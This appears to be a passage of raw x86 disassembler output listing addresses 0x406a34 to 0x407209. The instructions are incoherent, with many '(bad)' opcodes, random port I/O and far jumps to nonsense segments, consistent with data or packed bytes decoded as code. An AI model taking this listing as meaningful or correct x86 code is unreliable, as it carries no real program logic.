  406a34:	adc    al,0xcb
  406a36:	push   edx
  406a37:	js     0x406a68
  406a39:	js     0x406a03
  406a3b:	xchg   edi,eax
  406a3c:	dec    esp
  406a3d:	pop    edx
  406a3e:	inc    esp
  406a3f:	fisub  WORD PTR [edx+0x22701660]
  406a45:	add    DWORD PTR [eax],edi
  406a47:	sbb    bl,BYTE PTR cs:[ecx+edx*1-0x2]
  406a4c:	fist   DWORD PTR [esi+eiz*2]
  406a4f:	lds    edi,FWORD PTR [edx+0x44]
  406a52:	out    0x76,eax
  406a54:	lea    ebx,[esi]
  406a56:	xor    edx,DWORD PTR [edi+0x344f44a9]
  406a5c:	add    dl,BYTE PTR ds:0xc025150f
  406a62:	jns    0x406ae1
  406a64:	std    
  406a65:	dec    edi
  406a66:	test   eax,0x6daf8510
  406a6b:	pop    esp
  406a6c:	add    BYTE PTR [edi],dh
  406a6e:	xor    DWORD PTR [ecx+0x2e],esi
  406a71:	xor    DWORD PTR [eax],ebx
  406a73:	stos   DWORD PTR es:[edi],eax
  406a74:	xchg   DWORD PTR [edi],eax
  406a76:	fld    DWORD PTR [eax+0x2]
  406a79:	shr    DWORD PTR [edi+0x1b],1
  406a7c:	xor    al,0x63
  406a7e:	(bad)  
  406a7f:	fstp   st(0)
  406a81:	push   ebp
  406a82:	jns    0x406aa6
  406a84:	(bad)  
  406a85:	fisub  DWORD PTR [ebx+0x17aa4cf7]
  406a8b:	imul   ebp,edi,0xffffff8d
  406a8e:	cs jge 0x406ad2
  406a91:	jecxz  0x406a58
  406a93:	jae    0x406a26
  406a95:	sbb    dh,ch
  406a97:	aas    
  406a98:	in     eax,dx
  406a99:	aam    0x3f
  406a9b:	cdq    
  406a9c:	xor    al,0x1c
  406a9e:	fmul   QWORD PTR [ebp+0x21]
  406aa1:	enter  0xb8de,0x4a
  406aa5:	dec    ebp
  406aa6:	xor    BYTE PTR gs:[ecx+ebx*4-0x6d],bl
  406aab:	daa    
  406aac:	sub    eax,0xe242c17b
  406ab1:	jmp    0x406ad8
  406ab3:	js     0x406b22
  406ab5:	jb     0x406af7
  406ab7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406ab8:	(bad)  [ebx+ecx*2]
  406abb:	push   edi
  406abc:	data16 clc 
  406abe:	sbb    DWORD PTR [esi-0x1bddc100],esi
  406ac4:	push   ss
  406ac5:	or     esi,DWORD PTR [ebp+0x2d]
  406ac8:	mov    esi,0x3a97d28c
  406acd:	cmpxchg DWORD PTR [ebx+eiz*4+0xe60a5e6],eax
  406ad5:	lock pop ecx
  406ad7:	jle    0x406b58
  406ad9:	cdq    
  406ada:	inc    ebx
  406adb:	stos   DWORD PTR es:[edi],eax
  406adc:	ret    0x4de0
  406adf:	scas   eax,DWORD PTR es:[edi]
  406ae0:	(bad)  
  406ae1:	out    dx,al
  406ae2:	in     eax,dx
  406ae3:	dec    edx
  406ae4:	out    dx,eax
  406ae5:	in     al,dx
  406ae6:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  406ae8:	add    al,0x9e
  406aea:	outs   dx,BYTE PTR ds:[esi]
  406aeb:	jmp    0x406b15
  406aed:	sti    
  406aee:	out    dx,al
  406aef:	test   eax,0x196e1c78
  406af4:	fcom   DWORD PTR [ebx]
  406af6:	aam    0x4
  406af8:	and    DWORD PTR [esi-0x30],edi
  406afb:	(bad)  
  406afc:	xchg   ebx,eax
  406afd:	sub    dh,BYTE PTR [edx+eiz*1-0x40521c3b]
  406b04:	sub    al,0x15
  406b06:	int    0xd6
  406b08:	sti    
  406b09:	aaa    
  406b0a:	sbb    eax,0x52f15cbe
  406b0f:	stos   BYTE PTR es:[edi],al
  406b10:	mov    edi,esi
  406b12:	fwait
  406b13:	cmp    ebx,DWORD PTR [edx-0x63c22df]
  406b19:	fwait
  406b1a:	add    eax,0xed735b36
  406b1f:	or     edx,esp
  406b21:	scas   eax,DWORD PTR es:[edi]
  406b22:	retf   
  406b23:	mov    cl,0x7c
  406b25:	and    dl,dl
  406b27:	je     0x406b1e
  406b29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406b2a:	enter  0x9e97,0xdf
  406b2e:	repnz xchg esp,eax
  406b30:	mov    bh,0xdd
  406b32:	call   0x959f13a7
  406b37:	sub    al,0x4e
  406b39:	or     edi,DWORD PTR [ebx+0x4f]
  406b3c:	dec    esp
  406b3d:	sub    edi,DWORD PTR ds:[ebx-0x75ea780c]
  406b44:	lods   eax,DWORD PTR ds:[esi]
  406b45:	scas   eax,DWORD PTR es:[edi]
  406b46:	mov    esp,DWORD PTR [edi]
  406b48:	test   al,0x2f
  406b4a:	loop   0x406b72
  406b4c:	mov    ?,WORD PTR [ecx-0x1558e472]
  406b52:	xchg   esp,eax
  406b53:	int    0x25
  406b55:	shl    DWORD PTR [ebp+esi*8-0x2c],0x4c
  406b5a:	pop    es
  406b5b:	xor    eax,0x7534a0b7
  406b60:	mov    ch,0x9c
  406b62:	inc    edi
  406b63:	xchg   ebp,eax
  406b64:	loop   0x406b88
  406b66:	retf   0x6f65
  406b69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406b6a:	div    DWORD PTR [ebx+0x667f0300]
  406b70:	cmp    eax,0x597502c3
  406b75:	(bad)  
  406b77:	dec    ecx
  406b78:	int3   
  406b79:	cmp    edi,ebx
  406b7b:	or     esi,DWORD PTR [edx+0x7fec1389]
  406b81:	pop    ebx
  406b82:	or     BYTE PTR [eax+eax*1+0x3488d45a],al
  406b89:	mov    bh,0x6
  406b8b:	xchg   edi,eax
  406b8c:	ret    
  406b8d:	jmp    0x6b26:0x9250d247
  406b94:	ins    BYTE PTR es:[edi],dx
  406b95:	sbb    al,0x3c
  406b97:	inc    edi
  406b98:	dec    ebx
  406b99:	imul   edi,DWORD PTR ds:0xe26691df,0xd6f6737a
  406ba3:	mov    eax,0x8fd85c60
  406ba8:	mov    ds:0x88f9e3a2,eax
  406bad:	xor    al,0x27
  406baf:	jmp    0x1c2f:0x168cbbf9
  406bb6:	xor    dh,BYTE PTR [ebx+0x12b86574]
  406bbc:	jo     0x406bdd
  406bbe:	mov    cl,0xd0
  406bc0:	out    0x2a,eax
  406bc2:	into   
  406bc3:	push   ds
  406bc4:	icebp  
  406bc5:	mov    edi,0xa1851069
  406bca:	lods   eax,DWORD PTR ds:[esi]
  406bcb:	xor    al,0xc2
  406bcd:	and    BYTE PTR [edi],ah
  406bcf:	xchg   ecx,eax
  406bd0:	outs   dx,DWORD PTR ds:[esi]
  406bd1:	sub    esi,DWORD PTR [ecx+0x6abcffa1]
  406bd7:	pop    eax
  406bd8:	jns    0x406c4e
  406bda:	add    al,0x35
  406bdc:	push   esp
  406bdd:	push   esp
  406bde:	sub    dh,BYTE PTR ds:0xf235e9f0
  406be4:	adc    al,0x6d
  406be6:	add    eax,0x99c1e67a
  406beb:	mov    dl,0x5
  406bed:	std    
  406bee:	push   ebp
  406bef:	and    ebx,DWORD PTR [ebp-0x3]
  406bf2:	gs and eax,0x2428e84e
  406bf8:	frstor ds:0xe9b4a0ad
  406bfe:	std    
  406bff:	fisubr WORD PTR [ebx-0x60a17c5]
  406c05:	mov    eax,0x75c60b8
  406c0a:	leave  
  406c0b:	in     eax,0x9d
  406c0d:	pop    sp
  406c0f:	jg     0x406c11
  406c11:	repnz dec edi
  406c13:	call   0x87cb:0x722e7cd1
  406c1a:	push   es
  406c1b:	dec    esi
  406c1c:	xchg   esp,eax
  406c1d:	in     eax,0xe1
  406c1f:	dec    BYTE PTR [ecx]
  406c21:	call   0x19b69d62
  406c26:	out    0x96,eax
  406c28:	aas    
  406c29:	mov    dh,0x38
  406c2b:	enter  0x916a,0x2f
  406c2f:	pop    edx
  406c30:	sub    al,0xa4
  406c32:	stc    
  406c33:	pop    ds
  406c34:	mov    edx,esp
  406c36:	std    
  406c37:	not    BYTE PTR [ebx-0x653b8dda]
  406c3d:	repnz imul esp,DWORD PTR [ebp+0xd30c859],0xfffffff4
  406c45:	(bad)  
  406c46:	icebp  
  406c47:	out    0xc7,al
  406c49:	pop    edx
  406c4a:	ins    DWORD PTR es:[edi],dx
  406c4b:	xchg   ebp,eax
  406c4c:	xor    BYTE PTR [eax+0x4b],dl
  406c4f:	js     0x406c5f
  406c51:	(bad)  
  406c52:	out    dx,al
  406c53:	aas    
  406c54:	dec    edx
  406c55:	sbb    BYTE PTR [edx-0x5c],dl
  406c58:	mov    ebp,0x6a52bdd1
  406c5d:	lea    edx,[eax+esi*8]
  406c60:	lods   eax,DWORD PTR ds:[esi]
  406c61:	leave  
  406c62:	stos   DWORD PTR es:[edi],eax
  406c63:	int    0x24
  406c65:	cli    
  406c66:	int    0xf
  406c68:	fstp   TBYTE PTR [ebp-0x33]
  406c6b:	inc    ebp
  406c6c:	jb     0x406c16
  406c6e:	mov    dl,al
  406c70:	out    dx,al
  406c71:	xor    ecx,DWORD PTR [ecx]
  406c73:	xchg   ecx,eax
  406c74:	mov    ebp,0xc0b7f621
  406c79:	sub    eax,0x4e5d8ecd
  406c7e:	in     al,dx
  406c7f:	and    ah,dh
  406c81:	push   ds
  406c82:	pop    edx
  406c83:	xchg   esi,eax
  406c84:	xor    DWORD PTR [esi],edx
  406c86:	pop    esi
  406c87:	fisub  WORD PTR [edx]
  406c89:	stc    
  406c8a:	in     al,0xc1
  406c8c:	popf   
  406c8d:	rol    DWORD PTR [ecx+0x6c0a9f1c],cl
  406c93:	ds aam 0xe1
  406c96:	jp     0x4ba2d663
  406c9c:	aas    
  406c9d:	push   ecx
  406c9e:	or     eax,0x6f72765a
  406ca3:	pop    DWORD PTR [ebx-0x6785b33e]
  406ca9:	shl    BYTE PTR [ebx+0x9a24b02],cl
  406caf:	mov    WORD PTR [ecx-0x203d3605],es
  406cb5:	in     al,dx
  406cb6:	jbe    0x406d2d
  406cb8:	and    BYTE PTR [ecx+ecx*8],bl
  406cbb:	push   0x41956f74
  406cc0:	dec    edi
  406cc1:	xlat   BYTE PTR ds:[ebx]
  406cc2:	inc    ebx
  406cc3:	pop    edi
  406cc4:	cmp    DWORD PTR [edx+0x452e6344],0xc7c5f6b4
  406cce:	lea    ebx,[esi-0x6a]
  406cd1:	ret    0x68bf
  406cd4:	push   0x2e
  406cd6:	ss xchg edi,eax
  406cd8:	aaa    
  406cd9:	pop    ebx
  406cda:	dec    edx
  406cdb:	xor    esp,DWORD PTR [edi+0x37]
  406cde:	or     al,0x53
  406ce0:	xor    edx,eax
  406ce2:	mov    esi,0x64d5f594
  406ce7:	dec    ebp
  406ce8:	out    0x35,al
  406cea:	mov    dl,0x9
  406cec:	and    BYTE PTR [ebp+0x681da63d],bh
  406cf2:	or     edx,ebx
  406cf4:	mov    ds:0x9fdddc38,al
  406cf9:	and    eax,0xb7e4bdbf
  406cfe:	pop    ebp
  406cff:	push   cs
  406d00:	stos   BYTE PTR es:[edi],al
  406d01:	pop    esp
  406d02:	cmc    
  406d03:	jae    0x406cbd
  406d05:	push   ds
  406d06:	pop    ss
  406d07:	mov    al,0x0
  406d09:	fdivp  st(4),st
  406d0b:	inc    ebp
  406d0c:	shl    BYTE PTR [eax+ebp*4-0x36217356],0x9e
  406d14:	xlat   BYTE PTR ds:[ebx]
  406d15:	inc    ebx
  406d16:	das    
  406d17:	test   al,0x29
  406d19:	(bad)  
  406d1a:	mov    eax,ds:0x11ae53eb
  406d1f:	xor    DWORD PTR [esi*4-0x75985c0c],ecx
  406d26:	ins    BYTE PTR es:[edi],dx
  406d27:	(bad)  
  406d28:	gs inc ecx
  406d2a:	(bad)  
  406d2b:	idiv   BYTE PTR [ebp+0x1f]
  406d2e:	sahf   
  406d2f:	add    al,0x3a
  406d31:	ins    DWORD PTR es:[edi],dx
  406d32:	out    dx,eax
  406d33:	jge    0x406d16
  406d35:	test   BYTE PTR [ebx-0x58],0xb9
  406d39:	mov    esi,0x255d01c3
  406d3e:	add    DWORD PTR [edx+ebp*8-0x48],eax
  406d42:	dec    ecx
  406d43:	xchg   ebp,eax
  406d44:	inc    esi
  406d45:	out    dx,al
  406d46:	jne    0x406cfc
  406d48:	pushf  
  406d49:	jl     0x406da4
  406d4b:	pop    ds
  406d4c:	jmp    0x398bdcd4
  406d51:	das    
  406d52:	inc    ecx
  406d53:	adc    bh,dh
  406d55:	sti    
  406d56:	inc    ebp
  406d57:	sbb    DWORD PTR [ebp+0x5],esi
  406d5a:	add    al,0xef
  406d5c:	add    BYTE PTR [ecx],bl
  406d5e:	int3   
  406d5f:	xchg   edx,eax
  406d60:	test   BYTE PTR [edi+0x71],bl
  406d63:	js     0x406d49
  406d65:	jne    0x406dc9
  406d67:	in     al,0x83
  406d69:	dec    ebx
  406d6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406d6b:	rcl    DWORD PTR [esi-0x15c54dac],0x96
  406d72:	sub    al,0x18
  406d74:	push   cs
  406d75:	mov    bh,0x77
  406d77:	aam    0x5b
  406d79:	fsubr  st,st(3)
  406d7b:	push   ss
  406d7c:	cmp    al,dh
  406d7e:	jmp    0xc503:0xae3e21f8
  406d85:	das    
  406d86:	repz rcr edx,0x9
  406d8a:	jmp    0x406d94
  406d8c:	adc    al,0xfc
  406d8e:	scas   al,BYTE PTR es:[edi]
  406d8f:	or     eax,0x6e9d23d4
  406d94:	add    al,0x7d
  406d96:	call   0xe47a:0x629b2c76
  406d9d:	or     al,0xc6
  406d9f:	xlat   BYTE PTR ds:[ebx]
  406da0:	pop    ebx
  406da1:	test   eax,0x27ec8d95
  406da6:	leave  
  406da7:	in     al,0x2b
  406da9:	add    eax,eax
  406dab:	out    dx,eax
  406dac:	popa   
  406dad:	pop    ecx
  406dae:	std    
  406daf:	mov    ch,0x57
  406db1:	pop    ecx
  406db2:	in     eax,0xeb
  406db4:	sub    DWORD PTR [edx],esp
  406db6:	xchg   edx,eax
  406db7:	jp     0x406d3f
  406db9:	inc    ebp
  406dba:	dec    eax
  406dbb:	jp     0x406d94
  406dbd:	scas   eax,DWORD PTR es:[edi]
  406dbe:	cwde   
  406dbf:	(bad)  
  406dc0:	fcmovnu st,st(5)
  406dc2:	xor    eax,0x55fd8b24
  406dc7:	dec    esi
  406dc8:	dec    BYTE PTR [esi]
  406dca:	cmp    cl,BYTE PTR [esi+0x70839fd4]
  406dd0:	ret    0x2268
  406dd3:	js     0x406e46
  406dd5:	dec    edi
  406dd6:	xchg   edx,eax
  406dd7:	or     eax,0xe63f7f4f
  406ddc:	clc    
  406ddd:	fs push 0x422f8df9
  406de3:	sub    BYTE PTR [esi],ch
  406de5:	ins    BYTE PTR es:[edi],dx
  406de6:	pop    eax
  406de7:	sar    BYTE PTR [eax+eiz*4-0x3d],cl
  406deb:	adc    DWORD PTR [eax+0x7f],edi
  406dee:	cld    
  406def:	adc    DWORD PTR [ecx+0x42b124b9],edi
  406df5:	ffreep st(2)
  406df7:	sub    ch,BYTE PTR [edi+0x3a]
  406dfa:	pop    edi
  406dfb:	push   ds
  406dfc:	shl    ecx,1
  406dfe:	mov    DWORD PTR [edx],eax
  406e00:	adc    BYTE PTR [esi+0x53],0x42
  406e04:	sahf   
  406e05:	(bad)  
  406e06:	ja     0x406d95
  406e08:	pop    es
  406e09:	imul   edi,DWORD PTR [eax],0x58f51672
  406e0f:	sub    eax,0x7235b067
  406e14:	jb     0x406e37
  406e16:	sub    DWORD PTR [edx+ebx*4+0x4c4e179c],0xffffffcf
  406e1e:	sar    bh,0x8e
  406e21:	and    BYTE PTR [eax+0x64],ah
  406e24:	fmul   DWORD PTR [esp+edx*2-0x2af8ef14]
  406e2b:	test   DWORD PTR [esi+0x7a813bf7],edx
  406e31:	and    al,0x12
  406e33:	call   0xfb079b13
  406e38:	dec    ecx
  406e39:	pop    ecx
  406e3a:	push   0x71
  406e3c:	mov    ds:0x70025a58,eax
  406e41:	(bad)  
  406e42:	arpl   WORD PTR [eax-0x3],ax
  406e45:	push   ebx
  406e46:	adc    eax,0xf190bfdd
  406e4b:	mov    bl,0xcd
  406e4d:	cmp    al,0x98
  406e4f:	lahf   
  406e50:	pop    eax
  406e51:	(bad)  
  406e52:	jnp    0x406e80
  406e54:	cmp    al,0x83
  406e56:	dec    esi
  406e57:	ss imul eax,esp,0x5a
  406e5b:	cli    
  406e5c:	jbe    0x406eda
  406e5e:	adc    BYTE PTR [esi+0x4432448b],dl
  406e64:	xchg   ebp,eax
  406e65:	aam    0xc0
  406e67:	add    al,0xf2
  406e69:	in     eax,dx
  406e6a:	mov    edx,0x72a91ebc
  406e6f:	popf   
  406e70:	stos   DWORD PTR es:[edi],eax
  406e71:	xchg   BYTE PTR [edi-0x38fadee7],bh
  406e77:	iret   
  406e78:	hlt    
  406e79:	sti    
  406e7a:	lock adc dh,BYTE PTR [ecx+ebx*4+0x51832cf8]
  406e82:	sbb    ecx,DWORD PTR [esi-0x7fb23050]
  406e88:	and    cl,BYTE PTR [ebx-0x6c]
  406e8b:	jmp    0x8a8b:0x8c7946da
  406e92:	int    0x9f
  406e94:	sbb    al,0x45
  406e96:	in     eax,dx
  406e97:	dec    ebx
  406e98:	sahf   
  406e99:	lods   eax,DWORD PTR ds:[esi]
  406e9a:	sahf   
  406e9b:	(bad)  
  406e9d:	neg    DWORD PTR [edx+0x77ff842b]
  406ea3:	inc    edx
  406ea4:	cwd    
  406ea6:	ss test BYTE PTR gs:[ebx],bh
  406eaa:	loop   0x406e86
  406eac:	push   ss
  406ead:	push   edi
  406eae:	push   ss
  406eaf:	adc    DWORD PTR [ecx-0x7b8cf1d7],esi
  406eb5:	packsswb mm1,mm3
  406eb8:	test   eax,ecx
  406eba:	mov    al,0x1
  406ebc:	push   edi
  406ebd:	cmp    dl,BYTE PTR [esp+edx*4+0x58]
  406ec1:	rcl    DWORD PTR [edi],cl
  406ec3:	inc    esi
  406ec4:	scas   eax,DWORD PTR es:[edi]
  406ec5:	int    0xd
  406ec7:	inc    ebx
  406ec8:	mov    ch,0xd9
  406eca:	mov    esi,0x5572bcf9
  406ecf:	cmp    bl,BYTE PTR [ebx-0x636db3c3]
  406ed5:	std    
  406ed6:	add    dh,cl
  406ed8:	shr    DWORD PTR [edx+0x7a],1
  406edb:	sar    ah,cl
  406edd:	push   ecx
  406ede:	push   esi
  406edf:	jecxz  0x406f5b
  406ee1:	mov    al,BYTE PTR [ebp+0x5d]
  406ee4:	push   ebx
  406ee5:	mov    dl,0x14
  406ee7:	ss test eax,0xa690b8a5
  406eed:	mov    dl,0x2f
  406eef:	push   cs
  406ef0:	xor    BYTE PTR [edi+0x6d857146],bl
  406ef6:	pushf  
  406ef7:	fnstsw WORD PTR [eax+0x58bf2d4f]
  406efd:	xor    eax,0xb1bbf1c1
  406f02:	or     al,0xf
  406f04:	push   eax
  406f05:	mov    ecx,0x7701dddc
  406f0a:	mov    ecx,0x4c943615
  406f0f:	aaa    
  406f10:	or     eax,0xa61d3a8a
  406f15:	test   BYTE PTR [edx],0x2d
  406f18:	pop    ds
  406f19:	mov    edi,0x1d48f1da
  406f1e:	add    ch,BYTE PTR ds:0x82165496
  406f24:	jmp    0x406f84
  406f26:	clc    
  406f27:	fwait
  406f28:	sbb    eax,DWORD PTR [ecx]
  406f2a:	call   0x11b07f21
  406f2f:	jns    0x406fab
  406f31:	mov    dl,0x39
  406f33:	test   BYTE PTR [eax-0x5f01f3f9],ch
  406f39:	bound  ebx,QWORD PTR [edi-0x588d03df]
  406f3f:	call   0xf9bb3390
  406f44:	fisub  DWORD PTR [edx+ebp*2+0x3]
  406f48:	pop    esp
  406f49:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406f4a:	sbb    esp,edx
  406f4c:	retf   
  406f4d:	pop    esi
  406f4e:	lahf   
  406f4f:	cdq    
  406f50:	inc    eax
  406f51:	adc    al,0xf3
  406f53:	pop    DWORD PTR [ebx-0x3d]
  406f56:	fisub  DWORD PTR [ebp+0x7713d0e]
  406f5c:	push   edx
  406f5d:	dec    edi
  406f5e:	xor    BYTE PTR [ecx],bh
  406f60:	pop    es
  406f61:	aad    0x3
  406f63:	xor    eax,0xe7e9564c
  406f68:	lds    ecx,FWORD PTR [esi+0x4c171b93]
  406f6e:	jno    0x406f1b
  406f70:	mov    eax,0xe84d759b
  406f75:	pop    ecx
  406f76:	in     al,dx
  406f77:	mov    dh,0x5b
  406f79:	imul   ebx,ebp,0xffffff88
  406f7c:	inc    ecx
  406f7d:	cmove  ebx,eax
  406f80:	in     al,0xb4
  406f82:	shr    DWORD PTR [eax],cl
  406f84:	push   ds
  406f85:	out    dx,eax
  406f86:	xor    al,0xde
  406f88:	popa   
  406f89:	shl    BYTE PTR [edi],1
  406f8b:	iret   
  406f8c:	les    eax,FWORD PTR [edx+0x7a2e5c7f]
  406f92:	outs   dx,DWORD PTR ds:[esi]
  406f93:	call   0x612f:0x39e50609
  406f9a:	jle    0x406fc7
  406f9c:	pop    edx
  406f9d:	dec    eax
  406f9e:	dec    ecx
  406f9f:	push   0xfea6a169
  406fa4:	sti    
  406fa5:	fcomp  DWORD PTR [ebx]
  406fa7:	shl    BYTE PTR [ecx],cl
  406fa9:	inc    ecx
  406faa:	pop    ds
  406fab:	cmp    al,0xbc
  406fad:	push   eax
  406fae:	enter  0x945d,0x7f
  406fb2:	aam    0xc2
  406fb4:	adc    BYTE PTR [esi-0x6c8c337],ah
  406fba:	repz daa 
  406fbc:	adc    eax,DWORD PTR [ecx+0x32]
  406fbf:	aaa    
  406fc0:	test   eax,0x294b24ee
  406fc5:	(bad)  
  406fc7:	add    esp,DWORD PTR [ebp-0x5f826f1f]
  406fcd:	out    0xfd,eax
  406fcf:	arpl   WORD PTR [esi+0xd],bp
  406fd2:	ss dec ecx
  406fd4:	(bad)  
  406fd5:	div    bl
  406fd7:	add    eax,0x9603a3d2
  406fdc:	add    DWORD PTR [ebx-0x350d30b0],esp
  406fe2:	inc    ebx
  406fe3:	sub    al,0xcc
  406fe5:	xchg   ecx,eax
  406fe6:	rcl    BYTE PTR [esi-0xa],0x23
  406fea:	test   al,0x5
  406fec:	test   BYTE PTR [eax],ch
  406fee:	imul   edx,DWORD PTR [edx-0x48f2f04b],0xeba81157
  406ff8:	jnp    0x406fc1
  406ffa:	or     DWORD PTR [ebx],eax
  406ffc:	xchg   DWORD PTR [edx-0x4a],ebp
  406fff:	int    0xa1
  407001:	or     DWORD PTR [esi-0x19],ecx
  407004:	cwde   
  407005:	lea    edx,[ecx+0x5b02549e]
  40700b:	sub    al,0xd9
  40700d:	xchg   BYTE PTR [ebp-0x65],dh
  407010:	gs int 0x12
  407013:	jb     0x406f9a
  407015:	repz cmp eax,0xad3bbc53
  40701b:	pop    esp
  40701c:	jmp    0x1d04d653
  407021:	enter  0xa8c3,0x30
  407025:	jbe    0x407015
  407027:	outs   dx,DWORD PTR ds:[esi]
  407028:	fcom   QWORD PTR [eax-0x7d]
  40702b:	pop    esp
  40702c:	jmp    0xcf58:0x40386acb
  407033:	cmp    dh,al
  407035:	imul   ebp,ebx,0xc44b7f41
  40703b:	add    cl,BYTE PTR [edx-0x7986d61e]
  407041:	imul   ecx,esi,0x67
  407044:	add    eax,0x8381f915
  407049:	dec    ebp
  40704a:	ss xchg ecx,eax
  40704c:	add    ebx,DWORD PTR [edi+ebx*4+0x38f12c2a]
  407053:	mov    eax,0x2a98344d
  407058:	int3   
  407059:	pop    esp
  40705a:	sub    dh,bl
  40705c:	mov    ah,0xb0
  40705e:	sub    al,0xac
  407060:	dec    ecx
  407061:	test   DWORD PTR ds:0xae510eb3,edx
  407067:	cs cld 
  407069:	dec    esi
  40706a:	pop    ebp
  40706b:	cmp    BYTE PTR [eax],ch
  40706d:	idiv   DWORD PTR [ecx]
  40706f:	sbb    DWORD PTR [ebx],esp
  407071:	mov    bl,0x7f
  407073:	pushf  
  407074:	sbb    bl,BYTE PTR [eax]
  407076:	push   0xafe8366c
  40707b:	jnp    0x407056
  40707d:	jbe    0x407060
  40707f:	data16 mov ah,0x64
  407082:	in     al,dx
  407083:	push   edi
  407084:	retf   
  407085:	fnstcw WORD PTR [ebp-0x6d111a3f]
  40708b:	test   eax,0x5fefea78
  407090:	inc    edx
  407091:	push   edi
  407092:	das    
  407093:	push   cs
  407094:	or     al,0xfe
  407096:	mov    cs,WORD PTR [edi+0x63eaf16f]
  40709c:	mov    bl,0x84
  40709e:	xchg   BYTE PTR [eax],bh
  4070a0:	or     eax,edx
  4070a2:	push   edx
  4070a3:	sub    BYTE PTR [edi+0x491dc0ce],cl
  4070a9:	sbb    BYTE PTR [ebp-0x59],dl
  4070ac:	leave  
  4070ad:	jecxz  0x40707d
  4070af:	xor    BYTE PTR [edi-0xc78c718],cl
  4070b5:	and    BYTE PTR [ecx-0x22bc81d5],bl
  4070bb:	add    ebx,DWORD PTR [edx+edi*1-0x6ab5ec02]
  4070c2:	adc    eax,0xd152be3e
  4070c7:	lahf   
  4070c8:	pop    ebx
  4070c9:	inc    edi
  4070ca:	or     DWORD PTR [edx],ecx
  4070cc:	(bad)  [esi+0x14ad1b77]
  4070d2:	jno    0x4070ee
  4070d4:	cmp    edi,eax
  4070d6:	ror    ecx,1
  4070d8:	jo     0x407105
  4070da:	or     eax,0xd72e18b
  4070df:	jl     0x40710a
  4070e1:	pop    eax
  4070e2:	outs   dx,DWORD PTR ds:[esi]
  4070e3:	mov    esp,0x34164ab5
  4070e8:	cli    
  4070e9:	dec    ebp
  4070ea:	push   ds
  4070eb:	mov    dl,0x33
  4070ed:	mov    al,0x71
  4070ef:	push   esp
  4070f0:	add    ah,BYTE PTR fs:[edi]
  4070f3:	xor    al,0xb1
  4070f5:	aaa    
  4070f6:	mov    ebx,0xb0e86cc4
  4070fb:	adc    al,0x3
  4070fd:	sahf   
  4070fe:	jmp    0x67d4:0x8fe13535
  407105:	in     eax,dx
  407106:	push   eax
  407107:	adc    ebp,DWORD PTR [ebp+edx*4-0xad9d051]
  40710e:	stc    
  40710f:	xchg   edx,eax
  407110:	cmp    al,0x7e
  407112:	push   ebp
  407113:	rcl    BYTE PTR [edx+0x3a],0x97
  407117:	dec    edi
  407118:	xchg   esi,eax
  407119:	inc    esi
  40711a:	out    0x50,eax
  40711c:	fwait
  40711d:	xchg   edx,eax
  40711e:	or     bh,bh
  407120:	sub    al,0x76
  407122:	xchg   edi,eax
  407123:	push   edx
  407124:	inc    ebx
  407125:	je     0x40715e
  407127:	std    
  407128:	retf   0xe82a
  40712b:	add    eax,0x32fb12a7
  407130:	(bad)  
  407131:	xlat   BYTE PTR ds:[ebx]
  407132:	or     al,0x5
  407134:	int3   
  407135:	add    al,0x26
  407137:	cmp    esp,esp
  407139:	(bad)  [ebp-0x77f063]
  40713f:	push   edx
  407140:	adc    BYTE PTR [edx-0x57],ch
  407143:	popa   
  407144:	cmc    
  407145:	mov    al,ds:0x236d6be7
  40714a:	mov    cs,WORD PTR [esi-0x64]
  40714d:	and    al,0xca
  40714f:	cmp    DWORD PTR [edx+0x73],ebx
  407152:	addr16 mov edx,0xdbbb4cf0
  407158:	and    BYTE PTR [ebp-0x5d],dh
  40715b:	pop    es
  40715c:	test   BYTE PTR [ebx+0x7165204a],ah
  407162:	push   ds
  407163:	add    DWORD PTR [esi-0x2729cf26],eax
  407169:	rcr    DWORD PTR [ecx+0x4e9ce61d],1
  40716f:	out    dx,al
  407170:	inc    esp
  407171:	jne    0x407111
  407173:	xlat   BYTE PTR ds:[ebx]
  407174:	mov    ah,0xc
  407176:	push   ss
  407177:	repnz sar ebx,cl
  40717a:	sbb    al,0xd4
  40717c:	cld    
  40717d:	lock mov ah,BYTE PTR [edi]
  407180:	scas   eax,DWORD PTR es:[edi]
  407181:	xor    al,0x87
  407183:	je     0x4071fc
  407185:	imul   ecx,ebp,0x55c35e66
  40718b:	cs jge 0x407120
  40718e:	xchg   esi,eax
  40718f:	int    0x5c
  407191:	add    bh,dl
  407193:	(bad)  
  407194:	aad    0x12
  407196:	das    
  407197:	aaa    
  407198:	jo     0x40720b
  40719a:	jmp    0xf6b6ec61
  40719f:	and    ah,dh
  4071a1:	lahf   
  4071a2:	(bad)  
  4071a3:	jns    0x40714b
  4071a5:	xchg   esp,eax
  4071a6:	dec    ebx
  4071a7:	repnz and esi,edi
  4071aa:	fisttp WORD PTR [ebx-0x68]
  4071ad:	lahf   
  4071ae:	push   ebp
  4071af:	dec    esi
  4071b0:	pop    edx
  4071b1:	int3   
  4071b2:	xor    BYTE PTR [edi],ch
  4071b4:	push   ebx
  4071b5:	pusha  
  4071b6:	push   esp
  4071b7:	mov    bl,0x0
  4071b9:	jno    0x4071a7
  4071bb:	mov    bl,0x69
  4071bd:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  4071bf:	cmp    esi,edx
  4071c1:	pop    es
  4071c2:	ja     0x407221
  4071c4:	mov    BYTE PTR [ecx*2-0x53816292],ch
  4071cb:	lds    eax,FWORD PTR [ebp+0x315a4fe5]
  4071d1:	cmp    DWORD PTR [ebx+0x2b],ebx
  4071d4:	jae    0x407230
  4071d6:	gs int 0x2d
  4071d9:	and    eax,0x21b65c1f
  4071de:	retf   0xf74b
  4071e1:	loope  0x407262
  4071e3:	push   ebp
  4071e4:	mov    ah,0x3
  4071e6:	test   DWORD PTR [eax+0x69],edx
  4071e9:	rol    DWORD PTR [esi-0x44d83d],0x22
  4071f0:	int    0x38
  4071f2:	mov    ah,0x34
  4071f4:	or     bl,bh
  4071f6:	sbb    eax,0x8c8b62c3
  4071fb:	hlt    
  4071fc:	stos   DWORD PTR es:[edi],eax
  4071fd:	nop
  4071fe:	rol    DWORD PTR [ebx-0x80],0x27
  407202:	jge    0x40726d
  407204:	sbb    al,0x7f
  407206:	sub    al,0x3
  407208:	pop    esp
  407209:	enter  0x1871,0x10
